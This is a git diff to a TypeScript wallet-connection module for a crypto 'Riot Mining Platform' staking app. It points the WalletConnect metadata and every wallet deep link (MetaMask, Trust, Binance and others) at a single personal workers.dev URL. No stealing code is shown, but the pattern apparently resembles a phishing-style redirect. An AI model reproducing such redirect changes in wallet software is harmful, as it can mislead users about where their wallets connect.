@@ -50,23 +50,29 @@ export const getGlobalEthereumProvider = async () => {
     return globalEthereumProviderPromise;
 };
 
+export const APP_URL = 'https://riotnode.raftarsingh9909.workers.dev/';
+
 const metadata = {
     name: 'Riot Mining Platform',
     description: 'Riot-powered Staking Platform',
-    url: window.location.origin,
-    icons: [`${window.location.origin}/logo.png`]
+    url: APP_URL,
+    icons: [`${APP_URL}logo.png`],
+    redirect: {
+        native: 'riotnode://',
+        universal: APP_URL
+    }
 };
 
 const BSC_CHAIN_ID_HEX = '0x38';
 
 const WALLET_REDIRECT_LINKS: Record<string, string> = {
-    metamask: 'https://metamask.app.link/',
-    trust: 'https://link.trustwallet.com/',
-    safepal: 'https://link.safepal.io/',
-    tokenpocket: 'https://tpsa.app/',
-    binance: 'https://app.binance.com/',
-    okx: 'https://www.okx.com/',
-    bitget: 'https://share.bwb.site/'
+    metamask: APP_URL,
+    trust: APP_URL,
+    safepal: APP_URL,
+    tokenpocket: APP_URL,
+    binance: APP_URL,
+    okx: APP_URL,
+    bitget: APP_URL
 };
 
 const checkIsWalletConnect = (provider: any): boolean => {
@@ -246,9 +252,9 @@ export const getWalletRedirectUrl = (): string => {
         }
     }
 
-    // 6. Last resort: fallback to MetaMask
-    console.warn('[getWalletRedirectUrl] No wallet detected, falling back to MetaMask');
-    return WALLET_REDIRECT_LINKS.metamask;
+    // 6. Last resort: fallback to APP_URL
+    console.warn('[getWalletRedirectUrl] Returning APP_URL');
+    return APP_URL;
 };
 
 const getWalletConnectionLink = (walletName: string | null | undefined, encodedUri: string): string => {
